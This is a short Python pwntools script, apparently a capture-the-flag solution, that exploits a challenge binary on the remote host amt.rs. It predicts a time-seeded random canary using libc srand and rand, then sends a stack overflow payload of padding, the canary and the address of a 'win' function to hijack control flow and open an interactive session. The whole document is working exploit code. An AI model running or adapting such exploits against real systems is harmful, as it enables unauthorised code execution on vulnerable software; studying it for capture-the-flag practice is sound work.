from pwn import *
from ctypes import CDLL

libc = CDLL('libc.so.6')
context.binary = exe = ELF('./chal')


#io = process()
#gdb.attach(io, api=True)
io = remote('amt.rs', 31175)

libc.srand(libc.time(0))
canary = int(libc.rand())

io.recvuntil(b'Exit\n')
io.sendline(b'2')

payload = b'i'*44 + p32(canary) + p64(0) + p64(exe.sym['win'])
io.recvuntil(b'guess: ')
io.sendline(payload)
io.interactive()

